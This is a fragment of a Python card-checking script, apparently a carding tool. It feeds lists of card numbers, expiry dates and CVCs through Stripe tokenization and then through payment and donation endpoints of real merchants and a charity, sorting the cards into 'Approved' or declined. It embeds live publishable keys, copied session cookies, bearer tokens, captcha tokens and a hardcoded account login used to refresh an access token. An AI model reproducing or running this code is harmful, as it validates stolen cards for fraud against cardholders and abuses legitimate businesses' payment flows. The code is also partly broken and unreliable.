	    'data': 'ak_hp_textarea=&ak_js=1724186031293&__fluent_form_embded_post_id=282&_fluentform_6_fluentformnonce=7195011b3a&_wp_http_referer=%2Fpayment%2F&names%5Bfirst_name%5D=Christa&names%5Blast_name%5D=afadf&email=adfeaqfa%40gmail.com&datetime=14%2F08%2F2024&input_radio=Booking%20deposit&custom-payment-amount=1&payment_method=stripe&item__6__fluent_checkme_=&g-recaptcha-response=03AFcWeA74VPclPDBEBXLukOR4zhQ3OUyC9dyiKxDtSpKKnIomSjDO_W_I24SiybgEef0LUvCd51VrnypTHESIJB0Y48aw9IUq5GR1hpxrJvuEhwzxy813fls4OSIhGzgqKbrOwyDs9ag8JCMzJaPHC9jxjVbiCycBoWqmgZh3sSruCXr-RHOLKE_9lxoXKxrKyRjnM_rmIUaLbftg6caAxvRPvAwmOHZP6_u6mqhg_E_FFp-8MaabUjYM73DRhOZvZvWVR4BstkyMXYiWWsnXjwRjNxLtR6Ns5qNErkB-64MWhscD2G1XNHmZza3IaNBueUhXVUFLoSURuxzeQBjwPiR2rhlVW37pBZL3L5soU59Wl_fRhLZpfaz4dSly2IRak07SOcKE2cUtEz7ArVGBvvMpdn1ZWpIMrNbQuujINNbgJuae4y7KicpRUVnAwxBpO6sSeGXew36Seoh24Gebk9WpMesx3um8ICUxQW0eWNsbgU_6epORh_wuJveNxnoSzFSGvmd05vYppinggA_-LDymnx80tAlQGzBu6O5So4O675OdpWylDqoYYTKd4XUSXpms7RbWoBdLUsA30Eptbz_JMjOa5xLbh6_a6HEaiO52jtTC4A9iBxbw31AJZrMeSBqsRbwSewwN4AbyaFxaTS5TXDqXFLbRDr3JN9P8bp2ApNiqE5NaGVD7omDCY-ahgPpkTJtdKV5czWHrZgR4ypVkpsPmh1nBcOaw0fvYK1zDNbENO0RsgzkW3Td3rFojawbIfhvMCmSTp_hAlaWzlkMfPjfWCflsN9r31ufIClXliR6RNyevpB5IkVQMDJbYbQjbZc92vqRJ5FeuWT5clJ3BfmOQyJWv2SwnDi6Tv_S6G0YFcedQ2xN9bfPlN8sNdUszpm2yszoMEVgK1bXse0Z0u3sXjemvfrKcQx-Hwvm9sNoxz1AuaVp5wpPYRYAZlxXeObrLOootqDYfvSDthNKj8nhOBlUFX5RfamfmFd_4YKYD5j_fCQjvaCAcTafFxTd9iamiAwFLbJ6XF9W4XurvSDFiVAYyqseTwQB6bZjvWWlmswhXEdv3BN0fLv7mtbMAgTWmcHi2zcyvI_mMwslnlWW0pBYd56M5TQzMOKWz7R2VZnhxbjkOeZH2YGD6grkJV8tIWn03hKTCa3Yt_gaS83Z81gzHrrd1kgsWxPpOg9PMYPfg6K1nYRgo9u7aY3tSwru4Oxt6UpuK4t6DBQ-39zjB70ga1ajlE6rDik25_P-KQ7ARasHOryKeCurORj1WoUXQ4T8i2zxgFOD6jDh-Smz6brR53PMRDVue8jDjoA8QfYVIGGuxHS88bTtYz5WNC1T_MWOt1QmGbDyKjEi4bHoSnRyX1SjMK_LvkSm4g0_6VEysrhr8Oe5JfImz8Ajq14dadwjb1wiNQH6dO_UYQe0OjClV8AEWrC6JlpxhHDPPvmrH_mRXWzAXM4D_HQNKbtfrQJOpsClH3aEO4Q0uMGTElcyWpn-oEWG2nRnkMRa-LiPms8i848wswgXN1bKphPRlzLNcXqpoRBAR8JQDS8AGo7prrIWHQoJH9EuCsPu8uVldERcmXaHY69GzNVXqJuhJPzzhWITAsq2U69IfWdU2Vh5x7SR0OuAKAW7svxukAXtIdrqDmbUpQTWNf47P7FXbmFOzKkIb8iO4hiV0JsOfAyAG4P7-3gc_jfuTI1Yr2IDVFnYbEtxEPpSu6jOmQyS6jt7uREBcAWMiYjRzQgpOU_35-tncW1bZogz6pL9MKQfUYFzUdbJR7NEzT3CdcliYnzmlN-bqoXwEMqWeWVe78dXv363ujIIEGMHPaHy54Xf3uEzDkEtW0fIsOLPKTf2oM9-oeRAUnXIcc7IXOEiVmTJuHq8R0S6YWcvQMfSjG4aQXtVcoHGR4NVEy3GrQ79OJBJE&__stripe_payment_method_id=pm_1PpyksJc3XQZaeeMiTot490I',
    'action': 'fluentform_submit',
    'form_id': '6',
}
	
	response = requests.post(
	    'https://www.cakethat.ie/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	if 'success' in response.text:
		return 'Approved'
	try:		
		ct=(response.json()['client_secret'])
		cts=ct.split('_secret_')[0]
	except:
		print(response.json())
		return 'Your card was declined.'
	import requests
def xc(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
	 yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
	headers = {
	     'accept': 'application/json',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
}
	 
	data = f'guid=78502b00-c105-497b-a387-9c3a944bf38c9a78ff&muid=6335dc33-d0ed-4796-8786-b14c25c5b9fa7851e2&sid=d0f011cd-31e5-49a0-9f01-d0bcaf356e00352fb8&referrer=https%3A%2F%2Fsharethemeal.org&time_on_page=66210&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoicUpGV0NyQXIvVzduZG9XTjQwUFNycHp5eXJCZ1pNS3g1YkhWb05yWjVnV3h1bjRIcEkzUzFPRGhBK1JVL1VmaTdIblYyMnJZNlVzTVRTRWp3dVcrMXBZVlZwRUFSM0NpVTZZakgzQUpNTE8yT0pFUDJRUStTYkpWckdsNGRDVTh1Slo4SlNVR1NpWW5pbDByYlA4TURLY01SOUlDNFBHZnA0SExmdXZEZlIwRi9zNGQ4VmE1ZU9MazNoL2Rvb3lzQWZVclBJQndscmRvNXREWW9haEx1eDVaZnlqTjRiUGdTdkMzVkdFaFkxRy85WjVJc3VjNCtmN2IrZEZMS1dqb1ZWMFZrMDJuN1ZIcVFUUEhwT3pIMWppM24wWXhvUlpmUnh0WVhEYlIrYk9KQm5jMjFBclNPMWt4Q2xlSGlSUnZKcXpCOTdMeWdTeG9GMitJMWd0eDl1RU15RGxDYWM1ekV2U1F6ZGgyUDlPa0dUSyticjh3ci9Qc2pNQVhudFB4MytRcG00VTB5c3czeUpoVTlhQysvdnY3TFdvSHNxM3hsUklBTkNkUXA5RVdGaUhZS0RZcVZjQUZWUHNlT2ZrLzM5VEowRDFuYVd5NElUUE1LQUVxRWZEMndOd2ozRE9hb1ZLTFFxV0s3VmhXTmZ5RFBwd0pkRkpRK2tOQWZvSmtIZHRRUzBtTGFLalRGRGlpRU1Tam4wbUQyOGtuS2pPWUdaTkNHbDZrTmlJUzVHQmlpYTVDSzZheDNIUSs2TmtMMEs3dTBaVU0zWkVuNlNHcm10cFBHdi8wLy9sVEQwdVJIa1lUQXNVOWN4SVhhTEhURkZSNHV4aEQ4aTJWNElLOE1jS1BpTitpU053NjN3c1M2NmJXWlV2YXNnTjU0OTJqczlZaEtQM05YcXdOTW5BdXFUMGlMdHM2cFk1NzUza1pZaWVsVGVxandHSnJDMHEvTGhZMkhEOUxVVkFwZ3dTL1p6MHYyUElDakNPYXFjTmptQllUeWZrTm5aNDk2RE93SnZ3and1aFVDNGh2TFI2Z3BFTHdMT2xaYzQwdVhXK1RNOXA2eXltU0QxeWpnRUVGMGVFYkRRd210QUwrQ3BVYjR6R21WaGloNEJDaTQyeVFoSU5ROVlBeTdONEh1VUNoV25mZ1NsZmFwbnNIZSs0M2NCTVlUTHlxRzNMMzZ3dnpMVHR6K2xEdHFiU2FZUUF2REJqWXBpbWZxZDhUNVNUZ1lhaVRrQS9NQXVjQTlQRE9HSUpMRGxKYzEwWnBQbnVKSUNBdVRoL2YxMEwzYlJUQWQ2eGtLNi9aTUdmWVBVMGlqQUVDcGIwMHduamY5QjVBQllKcVpabDRZbmRDNThBU2VSMXE2TUZjVDVVdE83STlzNzlDOHFHUElUQXhSOHFqSWRqMkw3NkI5Qmp4S2dpN1BCR3E0clJmendycUU4M1FSRkVQTngra0sxMW5SQkhSeUFOUnA5MlBHd3NVUFBPNjZLS2JXL3prTW1xVC9WYVBWQ09OR2tYbW5vU0Y3RWNtMmY1WnQvOFFXbW5keGZVU1dLckQyRVlQcThHZ1IzcWRCWmJVTkg4UHlIWitESFliRDc2MmZPSlZTcFRzbEc1S3I0R1RKT3ZTa09jVUJOSEhmTHNUaUxLbWtJOWtROUMwcEg5d2lZWDNRb3E2WWtjNlFWMkJvU3cwRzRrdS9LMWNjMkRxSndmSWV5N3RsaitDcUJ6VkJXY1dselNtRUY5RnBYbFIzcGJoL0wwVURCMEIxdDFIUGlpelNRTUtVdzh2UDdXdlZMZjFUZDd5SUdod3BmWFptbHYwWXIrR0toelVmb2NZb1NjanZMbG9uemh1T2RNRlhOLzlqNmpDcHpkU1hNM01XM2k2bThaWFJXRG5rRVhZYjdqbVV6SkFsTzYyK1F6VTJ2c2ErdUl3cTlscjQ2M2xyYlpVQ1E4UjB4TDA1dyswcFczMmk4Q1cvT3lSQ2ZJMk1obzVkL1F0VTVNMU1lQnpiSjFzZmlVZzNLdFFyV2Z2NGZMNnVYMzh1dFREZGZkeEZVSmhHazU3ZUczWUJrQ3N5Z1poS0pvalVrOFRiRjMzbndlMzZpR05ZNzBwK09wM0VIUFd0NENoNHg1aS9OblRFZ2M5MjQ5cTBpa3hVZ0JmeGpCUG55SnhjUzNMZ0VGUmwwUjJQNzJhbThweUJYb2s1a0taTndnVHJWOTJFaCt1azBJOCtKQ055b3BSdC94Ny84S0hyMHlxRThLRS9PZHIyZ0lrODVOcDJuZHFLYTRKcmdBN1lpcHpnMUhtTU1SeFA5VmQxS0xpUVUrdEk1R3VyN1JmSmY2NER5eFN3b1hVS2hpbGVCaVBvM21rNWVhQ1grS01Sc2I1c3ppL0xrbDdYK0ViZmRQaWtFbzZpb0xuS0hpRnpuS1Q1RUxhc3RMNDNMblBERGZiWWdCNXk5WTRPaDZDNHVXVHMzQTJLMmVmalNWa0Y3dUtUWmcyTThaOHUzQWVpU1ZpUVhkZ1ljdlRQeUNvMDNDb3Z3Tnk1WGlrSVJZZW1KVUZEelJhbXNyekZFL1ArMVA0Q2NLZDJYcFFLckttOU5iYzVuWXFUQ0ozN2NZSS82Uld2TTFiRFZCSzFndk1NSXl0U0hCTTRSSk1TVXZLeXNLVlFCdWxRNlY1SU1sOHNFK0F5TUNySVVFWit5aXlNVlRMMzNMMGVTQXJlVzgzR3laS3M2ak04MmxBdnQwL1BiSzhqbWpRRFppMDFweWJnYzhLcTQ2ekd3Y2hYTkVFTVZvSkVXNzZQR29rdFdHV1AzQTVTUXA5bVNUb25hUjJaazg0S1ZlNDdqUFdGQUtMSHhyVnBzKzY4bVFaUlZXdWpJRkZXaHB1RHFVYmd3PT0iLCJleHAiOjE3MjQxODUxMDYsInNoYXJkX2lkIjo1MzU3NjU1OSwia3IiOiIyZTAzYzY3YiIsInBkIjowLCJjZGF0YSI6IjdodjMrdXVNRHJkWEpzNSt0bTkxSlh4bVhLbDd5aEtVWjlvaU1VUHNqOTZzcDQxQWxmZEZnNDh4WUlrQUhHcmhsd2pONmxqZ2NQVjNaS0U3NWV4S1EzN2ZXdHQvcExIUHBHSWppOVNjTWliQ0lwbUM0bHpUaWFHakkzZE5mR0ptTEd2eFkwdWZDajc1K2dzN2pnelV5UXpYUTlqZ0ZmOEJzS0FzbG96cWVncXVGQmtvMFpYOEN3ZXkraFE3Y1dJeEV2dDZXVitqeXpDTk85cmoifQ.jJp9Y4sGRrbsTBElZYPqTOc8fegafgGAEKKC0ABCCGk&payment_user_agent=stripe.js%2Fcb14e00af0%3B+stripe-js-v3%2Fcb14e00af0%3B+card-element&key=pk_live_51CG6QIAuAfacV15ffMAByPbXjXCzrIxODFNItPs4zRuFHJHY9kvYiuUeAvjD7OwPM64BoJQ23AJVrAWYMoC4GtxY00PMX2UyCa'
	 
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	
	
	token_id=response.json()['id']
	 # Second API Request for payment
	cookies = {
	     '_fbp': 'fb.1.1724184891415.987406108522220066',
    'stmDeviceId': 'aaa6f1c5-fbdb-4b41-bb4f-f24b6cb47407',
    'AMP_MKTG_7fe3705773': 'JTdCJTdE',
    '_tt_enable_cookie': '1',
    '_ttp': '6T_ZWQa-Csf_lTn1tWhddS5OeLT',
    'aws-waf-token': '72a16a53-114f-469b-9154-adc491fb5df6:IAoAoBGNUtJWAAAA:4bSQgO68ZbRgmIdsd7hk/YPIlLVmlyUMyd7vPiJCPhm+Z86MuA+zymVFX1LdnEu69Gmt8V+x89llDCSnojcqcZgLCTpqzEIeO/K8/Dg2mIbFEhsqN/DCKlekFvgCA913bLAEcazJafwRC0I3CyqidFiJyhAHhJe20mCzuQpRSInTu3hnYE0RX7lmcSIX6EYrJjE64+HFdhpudz19VECuOr8=',
    'connect.sid': 's%3Afjd82d56x4SJ6cTDyzKtKrKDUvmf5iEc.L%2FOfVcFwrrVrwcWqXDYHjbBg%2FxPfbf6WbRqE2olD%2BYM',
    '__stripe_mid': '6335dc33-d0ed-4796-8786-b14c25c5b9fa7851e2',
    '__stripe_sid': 'd0f011cd-31e5-49a0-9f01-d0bcaf356e00352fb8',
    '_ga': 'GA1.1.1105721689.1724184972',
    '_ga_N348N6YQFE': 'GS1.1.1724184972.1.1.1724184999.33.0.0',
    'AMP_7fe3705773': 'JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJhYWE2ZjFjNS1mYmRiLTRiNDEtYmI0Zi1mMjRiNmNiNDc0MDclMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzI0MTg0ODkxNTc5JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyNDE4NDk5OTIxMCUyQyUyMmxhc3RFdmVudElkJTIyJTNBMjIlMkMlMjJwYWdlQ291bnRlciUyMiUzQTMlN0Q=',
}
	 
	headers = {
	     'accept': 'application/json',
    'accept-language': 'ar-001',
    'authorization': 'Bearer LAXQszxcmpGMWi24y0NFt00YPWGJnJOo9Ba8ijLcI1fmiKHI1PDF7KG7PGJU7KcX',
    'content-type': 'application/json',
    # 'cookie': '_fbp=fb.1.1724184891415.987406108522220066; stmDeviceId=aaa6f1c5-fbdb-4b41-bb4f-f24b6cb47407; AMP_MKTG_7fe3705773=JTdCJTdE; _tt_enable_cookie=1; _ttp=6T_ZWQa-Csf_lTn1tWhddS5OeLT; aws-waf-token=72a16a53-114f-469b-9154-adc491fb5df6:IAoAoBGNUtJWAAAA:4bSQgO68ZbRgmIdsd7hk/YPIlLVmlyUMyd7vPiJCPhm+Z86MuA+zymVFX1LdnEu69Gmt8V+x89llDCSnojcqcZgLCTpqzEIeO/K8/Dg2mIbFEhsqN/DCKlekFvgCA913bLAEcazJafwRC0I3CyqidFiJyhAHhJe20mCzuQpRSInTu3hnYE0RX7lmcSIX6EYrJjE64+HFdhpudz19VECuOr8=; connect.sid=s%3Afjd82d56x4SJ6cTDyzKtKrKDUvmf5iEc.L%2FOfVcFwrrVrwcWqXDYHjbBg%2FxPfbf6WbRqE2olD%2BYM; __stripe_mid=6335dc33-d0ed-4796-8786-b14c25c5b9fa7851e2; __stripe_sid=d0f011cd-31e5-49a0-9f01-d0bcaf356e00352fb8; _ga=GA1.1.1105721689.1724184972; _ga_N348N6YQFE=GS1.1.1724184972.1.1.1724184999.33.0.0; AMP_7fe3705773=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJhYWE2ZjFjNS1mYmRiLTRiNDEtYmI0Zi1mMjRiNmNiNDc0MDclMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzI0MTg0ODkxNTc5JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyNDE4NDk5OTIxMCUyQyUyMmxhc3RFdmVudElkJTIyJTNBMjIlMkMlMjJwYWdlQ291bnRlciUyMiUzQTMlN0Q=',
    'origin': 'https://sharethemeal.org',
    'priority': 'u=1, i',
    'referer': 'https://sharethemeal.org/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'stm-app-version': '3.14.4',
    'stm-device-id': 'aaa6f1c5-fbdb-4b41-bb4f-f24b6cb47407',
    'stm-platform': 'web',
    'stm-request-id': 'fdc1a176-ea8d-4f3c-9184-b31bb04fd76d',
    'stm-timezone': 'Africa/Cairo',
    'user-agent': user,
    'x-aws-waf-token': '72a16a53-114f-469b-9154-adc491fb5df6:IAoAoBGNUtJWAAAA:4bSQgO68ZbRgmIdsd7hk/YPIlLVmlyUMyd7vPiJCPhm+Z86MuA+zymVFX1LdnEu69Gmt8V+x89llDCSnojcqcZgLCTpqzEIeO/K8/Dg2mIbFEhsqN/DCKlekFvgCA913bLAEcazJafwRC0I3CyqidFiJyhAHhJe20mCzuQpRSInTu3hnYE0RX7lmcSIX6EYrJjE64+HFdhpudz19VECuOr8=',
}
	 
	json_data = {
	     'amount': 13,
    'billingDetails': {
        'addressLine1': '1981 Jennifer Lane',
        'city': 'Raleigh',
        'country': 'EG',
        'email': 'adfeaqfa@gmail.com',
        'fullName': 'Amir Meor',
        'zipCode': '10080',
    },
    'campaignId': 'syria10',
    'currency': 'EGP',
    'doNotVault': False,
    'paymentMethodNonce': token_id,
    'paymentMethodToken': '',
    'paymentMethodType': 'CreditCard',
    'provider': 'stripe',
    'idempotencyKey': 'ec056a96-e7c7-41c1-9002-be6436ab8f28',
}
	 
	response = requests.post(
	     'https://app.sharethemeal.org/api/v2.0/payments/userHashPlaceholder/transactions',
	     cookies=cookies,
	     headers=headers,
	     json=json_data,
	 )
	try:
	 ii=response
	except:
	    return 'success'
	return ii 
	try:
	 ii=(response.json()['message'])
	 return ii
	except:
	  return 'Approved'
	   
	  
	  
	 
	
	# Note: json_data will not be serialized by requests
	
	# exactly as it was in the original request.
	#data = '{"id":10486458,"address":"9350 N Central Expy","name":"yusuf","country":"US","vat":null,"billing_account_id":10486458,"last4":"9305","orderReference":"nljannd","user_id":11296645,"organization_id":10807386,"hours":0,"balance_increase_in_cents":null,"payment_method_id":"pm_1PLSN5KEzvleW5flaDzdyat6","transcription_id":null,"plan":"pro_2023_05_01","order_id":null,"recurrence_interval":"month","extra_plan_hours":null}'
	#response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, data=data)
	 
	text = response.text
	print(text)
	  
	pattern = r'Status code (.*?)\s*</li>'
	 
	match = re.search(pattern, text)
	if match:
	 result = match.group(1)
	if 'risk_threshold' in text:
	 result = "RISK: Retry this BIN later."
	else:
	 if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
	  result = "1000: Approved"
	 else:
	  result = "Error"
	 
	if 'Success' in result or 'successfully' in result or 'thank you' in result or 'thanks' in result or 'approved' in result or 'fund' in result:
	  return 'Approved'
	else:
	 return result
	def bin(card):
	 return 'Your card was declined.'
def sf(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	def up():
		import requests
		headers = {
		      'authority': 'api.layerpanel.com',
		    'accept': 'application/json, text/plain, */*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
		    'content-type': 'application/json;charset=UTF-8',
		    'origin': 'https://cp.layerpanel.com',
		    'referer': 'https://cp.layerpanel.com/',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
		}
		
		json_data = {
		    'email': 'hiwabo5572@iteradev.com',
		    'password': 'A@Amir112233',
		}
		
		response = requests.post('https://api.layerpanel.com/api/auth/login', headers=headers, json=json_data)
		tok=(response.json()['token'])
		with open('gates.json', 'r') as file:
			json_data = json.load(file)
		json_data['amex']=tok
		with open('gates.json', 'w') as json_file:
			json.dump(json_data, json_file, ensure_ascii=False, indent=4)
		return chk()
	def chk():
		with open('gates.json', 'r') as file:
			json_data = json.load(file)
		try:
			tok=json_data['amex']
		except:
			up()
			return 'try again'
		headers = {
		    'accept': 'application/json',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
		
		data = f'muid=20187d7d-37a0-4397-9723-e914450227c21d6ac1&sid=471a1679-7443-4df0-a514-1e45ea781340d8bae9&guid=78502b00-c105-497b-a387-9c3a944bf38c9a78ff&referrer=https%3A%2F%2Fcp.layerpanel.com&time_on_page=21712&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiSlc1dUlvM2syb2ZjdTFvS2RUNEVtMkladlM3Vy9waCtuTERHdldlMEdENk9yN2tmQVFNc0NoTCtZUzNDRFJxaGRTZUFLV3R4YTBEdERPeTI3UlQxUHFPdGg2TmkwZVV6TTMyRkVvTFFBUHpwUnptdVlXYUM3aFdjV2ZrM1c4Vmg4RnlGSWN6UTVhYUo1VjBpV21PVTZqVWRIWWx2Wm9xQWN2UUpKRGMvZS9Wb0VTSnVEek1nYU5rc0ZtOUMydzFuZmlTcy9WWWMwU2FCd3pHbUdCQTJIZXM0S0hlRm5lcVVGcU80NDh2MjE4c1o5TlVkZS9SNnRSRTlRZklUdTMrSmFhZXZzcTYzWmZ0RHA1NkNPVVFpUWQ3aTJCVS9hbmpIRGMyQUpCZG11MlVsTSttQTk3WTUyd3VweTlJb3F6MUpVMHJlRzhlOHFucVhDNXNnVzVWQTA1MTZsdmZXNHU5bncyNWtxMWh2Y283aEJJWDJBcWR1ZU12QWJmYVk0eW5nam05YVp1VHp2SlVqc3VwT242Z0lnQmRIeWFYK09IenkvTW9vWC9kM05oTnFPZ3NUbGlqRm1hWklkMzhDanA5N2dmemJkMExLUmU5U2hnbFE0cXRwWFpuV1kxd2kzcTVCWEp5SFZFSEk5dVlkS1pMQkJ3Ujd1TVczMDE2U0xEOHNnbEkyazlrV1VwZEJJSGVlZ2dJaDByc2Q0cW1qNDBJOFgyVW9RSVZSUW9GdW90MTZKQkJFVjhNai9KNzVCV05rNVJvekprUkJTSk1FNUhScjZKUlk1TWd1d2Zyb3VLUUwzOVVpUTZWS0d1cEtwRkp1R3dlYXRobVdEZ0tnei81OVFLckxQVSsyYzNCeERLRmJGOXBzOTJuSWxBVDZLTFB1eWUxOHZiVXZEYm9hU2NCNlJtUG4xdW1vTEl0cVVUYW0yQlpxOHZweTVVZUdaNnhPdEZSSk1qTGNtV1h5MVVDS0pqTHNqems4Q2xHNm1mL01pcTIrb3EwQndJdHp6ai9zRDJQaTgvY0pmcUFMMmdQRCtFSi9hWXJFMnRZbTRSOWtURW9SZlJTbVVqVDM2dlJuNVN5UHZpcHZvbWowMHFGN2s1RTdCMW12K1dWek1mQU1lMk9XWHpxRWpXNFpqUVMwRnl4cklMZEU1cm1mUXNwcGdzVlB0cmYxWjJncXJKVkgzdzRRRDI0S0c5UmlFdndoblVRR1NHM0RTNWVESkJSVGs4TERCUmp2Tzg2cFNEWjRrS0U0aHdhQ1dBRlJ1SVpYTy9QU3p3WEpGL0RvOXU2UGNmbTR4NzJXVG1VNklVTGN1Nlc1QURaRXdEanpjY2tDS1lxMkFwMHkzK05CVEl4eVFneE9ReDJKLzArTmlXRmkzdDlmck9FS2lBMFBBWjNJYk9LcnM3TE84bkhQb2ZnMmhRck84TjBZRnN1U2E0SldZQ0dueklQNldMUHJVYmN1d2ZrckJYZk1tNmNrVFhhc0NrcmM2UDhZenpuV3ZvM0pmaGxXbjdSNm5KU3ZiWFFNYVZySjg1aVZnSXhwS2NKdVI5OEZISzRyUVpzN3VjVzlEeUM0V2RNMHNoSC80UzBvdjA2Y0phcjF6UzBCa3dEMDEyRWdzVUVvNTFiYTVhVEtYTUNHSUlWbWU4SnF5N0VOQTR2SG4vOUlhTUdsaC9GT2dPNjltL0ZGMU10QW1OZ1MwMFRiQzB5L0dEMCtjb3N2c2lZY090YkUvK0NDNlhTc1BHekxFT0VzL0R1d1JEMklNRVEzc1REOU95NnFNejN2T3licjEwZk02YmJYMmtnVXhTeVVyZXRTKzNnVFNpYzg5STcycm9Ob2pBL1QzMytUZFR3bnVraW9BdG1hWFpEQWpFL1NOWERWekZzUlZmSDdkcXYwemJTVENEOFdod25ZRWhKQjBGU2k1TXRhWTBWSXZXejJDeW1YSmVienYyOTllZ3E5OHdSMnJucEExYy8wM0I4cVdnYVNIRVhDUi96dnd5L3RlNFo4Nmc4M2F0bW14U04wZVBlcTdYVGtZVnF4V2prWEw4d1p0SVRReERhTU1HNTE1TWxLanJEZERuUFluMU1NbjEvT1RCYVVwZzFMYXRXWjNVdnF3UWlSYzZqMTZKRzUvcDJvelR1Wm9XWXgxNGpHcGdZUitJOFVWSVFpcWIra25MUy9rYlNpaUpoTmcyeDR1Mnp6SUNOK3FQTDBDVWttUUxyY3dpSDBPT25LSVdzeGZjYzhHOGxvYmRDWER3VU5LbnRzc2VJalBPZ2VlekpUKytnY0dmNllKY0dKRlJQZ0YvRVVGaFpjQ2h6Qld1SXIvNWpMZkllRzhVTmF6MDZpR0Fzdjc3QjRtdGVvRFRsWUpSaXI5cHltMW9kcFkrNTVCNC9EZm9mWFNTcFd5QzFyN3IvT2FRZTlXYy9mYUlMcEt2eTFKMi9YNWhxSTRyZEQyT2JtQjJpYXMvYW42RUpzOVR1Y2U0dlJaNDJya0MrMlRHMm5RdHlOMTBsRkN4MXNTN0VjOFVYZ0xSOWVlMXZsK0NQMTF3dHJBczN0YlNLaDNDdzhyUUQ1cU1xcE12cDJFU3pnUlBQeUFFU1RaYWtPMVJVVSt0QmkySm5pNXh5bDFXYzcrNlc4N1g4YlorcHh4ODliRVNmS3JNU21UQk9TQVF1b2w3VTd2TUpFYWxWS0YzbGNobmcyQnhub0xzOXBtK2s2dk1UNU4yVU5sbEwrKzg5YUdSRmVHUUZKVXhtUFl4cHhIRGZkbEZxdFhUTWpRSm9LSjc0ZTduSVJkSUtoMm82YWNvbUcxdS9QaHFJT2doNlVZKzQ5QndjRjhhMGcwNllaMGVveE9Lc0MvVThyVmtvOHI2R3VlYW1lNDA3QWM2QVlBdz09IiwiZXhwIjoxNzI0MTg0NTgzLCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMWQ0MDg0ZGEiLCJwZCI6MCwiY2RhdGEiOiIybWhjSDN6UitPUHpwMnBwcjRIa0srRmljdFBqTy9zVDZqdWJFVUVxeEJqL0dDQmdET0VEaGIvOGJXak1FMFprdm1DdGNnbDhHUGZndm5BOGJ0Qm1pTE5vWXpGOGhFMXdEYzR4US9ndG14cExvb0MzTzl6WDVsdlIxYTYwSEZvVlI5QlY4R211RTQ1ZnlmWjhGWFRidjQ1bS9GbXBjUTNvN0h5YXNvNGZ3cUx2NTRTcVJRNENjelY2Z2t6S2xaUUpkcmwyUGJFNjhQUGRHaHBWIn0.vmzn5NJHA_X8o7-4Qm6DFuRrOWDW4hcufVz5nMuWlRA&payment_user_agent=stripe.js%2Fcb14e00af0%3B+stripe-js-v3%2Fcb14e00af0%3B+split-card-element&pasted_fields=number&key=pk_live_NpGWSJbUrLyK21Xez5lc639e'
		
		response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
		try:
			id=response.json()['id']
		except:
			return(response.json()['error']['message'])
		headers = {
		    'accept': 'application/json, text/plain, */*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'account': 'GB-81835134',
    'authorization': f'Bearer {tok}',
    'content-type': 'application/json;charset=UTF-8',
    'locale': 'en',
    'origin': 'https://cp.layerpanel.com',
    'priority': 'u=1, i',
    'referer': 'https://cp.layerpanel.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
